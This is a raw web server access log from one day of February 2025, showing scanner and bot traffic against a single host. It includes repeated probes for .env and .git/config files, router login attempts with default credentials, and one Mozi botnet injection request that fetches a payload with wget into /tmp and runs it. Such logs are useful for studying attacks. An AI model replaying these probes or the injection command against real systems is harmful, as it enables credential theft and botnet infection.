162.216.149.112 - - [05/Feb/2025:00:04:59 +0000] "GET / HTTP/1.1" 200 947 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
206.168.34.209 - - [05/Feb/2025:03:20:50 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.209 - - [05/Feb/2025:03:20:51 +0000] "GET / HTTP/1.1" 200 966 "http://34.165.81.226/favicon.ico" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.209 - - [05/Feb/2025:03:20:55 +0000] "PRI * HTTP/2.0" 400 523 "-" "-"
141.255.166.90 - - [05/Feb/2025:03:34:35 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
45.79.181.104 - - [05/Feb/2025:03:47:58 +0000] "\x16\x03\x01\x01\n" 400 523 "-" "-"
45.79.181.104 - - [05/Feb/2025:03:48:00 +0000] "\x16\x03\x01\x01\n" 400 523 "-" "-"
31.13.224.222 - - [05/Feb/2025:03:50:33 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/538.1 (KHTML, like Gecko) QupZilla/1.8.6 Safari/538.1"
35.205.163.236 - - [05/Feb/2025:03:56:11 +0000] "GET / HTTP/1.1" 200 1003 "-" "python-requests/2.32.3"
78.153.140.93 - - [05/Feb/2025:04:31:13 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [05/Feb/2025:04:31:13 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [05/Feb/2025:05:10:03 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [05/Feb/2025:05:10:04 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
172.104.11.4 - - [05/Feb/2025:05:47:26 +0000] "\x16\x03\x01\x01\n" 400 523 "-" "-"
172.104.11.4 - - [05/Feb/2025:05:47:28 +0000] "\x16\x03\x01\x01\n" 400 523 "-" "-"
46.19.138.234 - - [05/Feb/2025:06:06:31 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
45.148.10.242 - - [05/Feb/2025:06:21:51 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 302 331 "-" "-"
45.148.10.242 - - [05/Feb/2025:06:21:51 +0000] "GET / HTTP/1.1" 200 1742 "http://34.165.81.226:80/cgi-bin/luci/;stok=/locale" "-"
117.210.210.38 - - [05/Feb/2025:06:26:07 +0000] "GET /boaform/admin/formLogin?username=user&psd=user HTTP/1.0" 302 350 "-" "-"
4.151.220.177 - - [05/Feb/2025:06:29:46 +0000] "MGLNDD_34.165.81.226_80\n" 400 523 "-" "-"
78.153.140.93 - - [05/Feb/2025:06:51:31 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [05/Feb/2025:06:51:31 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
179.43.191.146 - - [05/Feb/2025:06:55:43 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
172.168.40.198 - - [05/Feb/2025:06:58:27 +0000] "GET /druid/index.html HTTP/1.1" 302 331 "-" "Mozilla/5.0 zgrab/0.x"
128.199.242.159 - - [05/Feb/2025:07:18:48 +0000] "\x16\x03\x01\x01\x02\x01" 400 523 "-" "-"
205.210.31.103 - - [05/Feb/2025:07:57:10 +0000] "\x16\x03\x01" 400 523 "-" "-"
205.210.31.103 - - [05/Feb/2025:07:57:10 +0000] "\x16\x03\x01" 400 523 "-" "-"
198.235.24.175 - - [05/Feb/2025:08:24:08 +0000] "GET / HTTP/1.0" 200 1761 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
80.82.77.202 - - [05/Feb/2025:08:28:38 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1478.0 Safari/537.36"
185.242.226.80 - - [05/Feb/2025:08:29:27 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
45.144.212.139 - - [05/Feb/2025:09:06:47 +0000] "GET /.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G955F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.4 Chrome/67.0.3396.87 Mobile Safari/537.36"
51.254.59.113 - - [05/Feb/2025:09:15:18 +0000] "GET / HTTP/1.1" 200 1761 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
128.199.196.44 - - [05/Feb/2025:09:51:12 +0000] "\x16\x03\x01\x01\x02\x01" 400 523 "-" "-"
128.199.196.44 - - [05/Feb/2025:09:51:12 +0000] "GET /hello HTTP/1.1" 302 350 "-" "Mozilla/5.0"
78.153.140.93 - - [05/Feb/2025:10:02:47 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [05/Feb/2025:10:02:47 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
4.156.21.114 - - [05/Feb/2025:10:04:58 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 zgrab/0.x"
47.237.115.100 - - [05/Feb/2025:10:17:31 +0000] "\x16\x03\x01" 400 523 "-" "-"
87.120.115.34 - - [05/Feb/2025:10:26:04 +0000] "GET /_profiler/phpinfo HTTP/1.1" 302 350 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0"
8.217.171.143 - - [05/Feb/2025:10:46:59 +0000] "GET / HTTP/1.0" 200 1761 "-" "-"
8.217.171.143 - - [05/Feb/2025:10:47:50 +0000] "GET / HTTP/1.1" 200 1761 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
8.217.171.143 - - [05/Feb/2025:10:47:50 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
8.217.171.143 - - [05/Feb/2025:10:47:51 +0000] "GET / HTTP/1.1" 200 1761 "http://34.165.81.226/favicon.ico" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
185.91.127.88 - - [05/Feb/2025:11:17:06 +0000] "GET / HTTP/1.1" 200 1761 "-" "Mozilla/5.0"
185.91.127.88 - - [05/Feb/2025:11:17:06 +0000] "GET /robots.txt HTTP/1.1" 302 350 "-" "Mozilla/5.0"
185.91.127.88 - - [05/Feb/2025:11:17:06 +0000] "GET /sitemap.xml HTTP/1.1" 302 350 "-" "Mozilla/5.0"
141.255.166.90 - - [05/Feb/2025:11:36:18 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
185.242.226.10 - - [05/Feb/2025:11:38:58 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
87.121.84.7 - - [05/Feb/2025:11:40:29 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
128.199.170.18 - - [05/Feb/2025:11:44:48 +0000] "\x16\x03\x01\x01\x02\x01" 400 523 "-" "-"
128.199.170.18 - - [05/Feb/2025:11:44:48 +0000] "GET /hello HTTP/1.1" 302 350 "-" "Mozilla/5.0"
128.199.179.71 - - [05/Feb/2025:11:52:31 +0000] "\x16\x03\x01\x01\x02\x01" 400 523 "-" "-"
128.199.179.71 - - [05/Feb/2025:11:52:31 +0000] "GET /hello HTTP/1.1" 302 350 "-" "Mozilla/5.0"
87.121.84.7 - - [05/Feb/2025:12:26:28 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
128.199.219.78 - - [05/Feb/2025:12:27:37 +0000] "GET /hello HTTP/1.1" 302 350 "-" "Mozilla/5.0"
128.199.219.78 - - [05/Feb/2025:12:27:37 +0000] "\x16\x03\x01\x01\x02\x01" 400 523 "-" "-"
172.169.6.20 - - [05/Feb/2025:13:09:34 +0000] "GET /hudson HTTP/1.1" 302 331 "-" "Mozilla/5.0 zgrab/0.x"
139.59.101.104 - - [05/Feb/2025:13:14:24 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
185.196.220.253 - - [05/Feb/2025:13:41:43 +0000] "GET / HTTP/1.1" 200 1742 "-" "Hello World"
148.153.45.234 - - [05/Feb/2025:13:44:58 +0000] "GET /JieD HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.45.234 - - [05/Feb/2025:13:44:59 +0000] "GET / HTTP/1.1" 200 966 "http://34.165.81.226:80/JieD" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.45.234 - - [05/Feb/2025:13:44:59 +0000] "GET /kVf6 HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.45.234 - - [05/Feb/2025:13:45:00 +0000] "GET / HTTP/1.1" 200 966 "http://34.165.81.226:80/kVf6" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.45.234 - - [05/Feb/2025:13:45:00 +0000] "GET /aab8 HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.45.234 - - [05/Feb/2025:13:45:01 +0000] "GET / HTTP/1.1" 200 966 "http://34.165.81.226:80/aab8" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.45.234 - - [05/Feb/2025:13:45:02 +0000] "GET /aab9 HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.45.234 - - [05/Feb/2025:13:45:02 +0000] "GET / HTTP/1.1" 200 966 "http://34.165.81.226:80/aab9" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
202.21.42.141 - - [05/Feb/2025:13:46:49 +0000] "27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0" 400 523 "-" "-"
193.23.3.37 - - [05/Feb/2025:13:53:39 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 1083) AppleWebKit/537.36 (KHTML like Gecko) Chrome/28.0.1469.0 Safari/537.36"
213.136.86.62 - - [05/Feb/2025:14:21:05 +0000] "GET /build/.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
213.136.86.62 - - [05/Feb/2025:14:21:05 +0000] "GET /production/.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
213.136.86.62 - - [05/Feb/2025:14:21:05 +0000] "GET /new/.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
213.136.86.62 - - [05/Feb/2025:14:21:05 +0000] "GET /public/.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
213.136.86.62 - - [05/Feb/2025:14:21:05 +0000] "GET /debug/.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
213.136.86.62 - - [05/Feb/2025:14:21:05 +0000] "GET /_git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
213.136.86.62 - - [05/Feb/2025:14:21:05 +0000] "GET /administrator/.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
213.136.86.62 - - [05/Feb/2025:14:21:05 +0000] "GET /assets/.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
213.136.86.62 - - [05/Feb/2025:14:21:05 +0000] "GET /main/.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
213.136.86.62 - - [05/Feb/2025:14:21:05 +0000] "GET /beta/.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
213.136.86.62 - - [05/Feb/2025:14:21:05 +0000] "GET /cms/.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
213.136.86.62 - - [05/Feb/2025:14:21:05 +0000] "GET /temp/.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
213.136.86.62 - - [05/Feb/2025:14:21:05 +0000] "GET /backend/.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
213.136.86.62 - - [05/Feb/2025:14:21:05 +0000] "GET /staging/.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
213.136.86.62 - - [05/Feb/2025:14:21:05 +0000] "GET /frontend/.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
213.136.86.62 - - [05/Feb/2025:14:21:05 +0000] "GET /api/.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
213.136.86.62 - - [05/Feb/2025:14:21:05 +0000] "GET /old/.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
213.136.86.62 - - [05/Feb/2025:14:21:05 +0000] "GET /git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
213.136.86.62 - - [05/Feb/2025:14:21:05 +0000] "GET /blog/.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
213.136.86.62 - - [05/Feb/2025:14:21:05 +0000] "GET /dev/.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
213.136.86.62 - - [05/Feb/2025:14:21:05 +0000] "GET /backup/.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
213.136.86.62 - - [05/Feb/2025:14:21:05 +0000] "GET /app/.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
213.136.86.62 - - [05/Feb/2025:14:21:05 +0000] "GET /test/.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
213.136.86.62 - - [05/Feb/2025:14:21:05 +0000] "GET /tmp/.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
213.136.86.62 - - [05/Feb/2025:14:21:05 +0000] "GET /admin/.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
213.136.86.62 - - [05/Feb/2025:14:21:05 +0000] "GET /root/.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
213.136.86.62 - - [05/Feb/2025:14:21:05 +0000] "GET /sites/.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
213.136.86.62 - - [05/Feb/2025:14:21:05 +0000] "GET /v1/.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
213.136.86.62 - - [05/Feb/2025:14:21:05 +0000] "GET /static/.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
213.136.86.62 - - [05/Feb/2025:14:21:05 +0000] "GET /site/.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
213.136.86.62 - - [05/Feb/2025:14:21:05 +0000] "GET /wordpress/.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
